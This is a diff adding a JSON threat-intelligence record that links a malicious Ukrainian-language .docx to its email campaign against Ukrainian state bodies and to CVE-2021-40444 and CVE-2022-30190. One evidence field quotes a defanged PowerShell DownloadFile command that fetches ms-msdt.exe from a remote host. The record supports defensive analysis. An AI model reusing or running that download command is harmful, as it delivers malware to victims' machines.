@@ -1,0 +1,42 @@
+{
+  "relations": [
+    {
+      "head": "nod-update[.]it",
+      "type": "hosts-file",
+      "tail": "ms-msdt.exe",
+      "evidence": "DownloadFile('hXXps://nod-update[.]it/ms-msdt.exe','C:\\Users\\Public\\ms-msdt.exe')",
+      "fit": "exact"
+    },
+    {
+      "head": "зміни оплата праці з нарахуваннями.docx",
+      "type": "targets",
+      "tail": "Україна",
+      "evidence": "розповсюджувався серед державних організацій України засобами електронної пошти",
+      "fit": "new"
+    },
+    {
+      "head": "зміни оплата праці з нарахуваннями.docx",
+      "type": "exploits-vulnerability",
+      "tail": "CVE-2021-40444",
+      "evidence": "після експлуатації вразливостей CVE-2021-40444 та CVE-2022-30190",
+      "fit": "new"
+    },
+    {
+      "head": "зміни оплата праці з нарахуваннями.docx",
+      "type": "exploits-vulnerability",
+      "tail": "CVE-2022-30190",
+      "evidence": "після експлуатації вразливостей CVE-2021-40444 та CVE-2022-30190",
+      "fit": "new"
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "targets",
+      "definition": "The malicious file or threat activity is directed against the specified target country, sector, or organization."
+    },
+    {
+      "name": "exploits-vulnerability",
+      "definition": "The malicious file or tool leverages the specified vulnerability to execute arbitrary code or compromise a system."
+    }
+  ]
+}
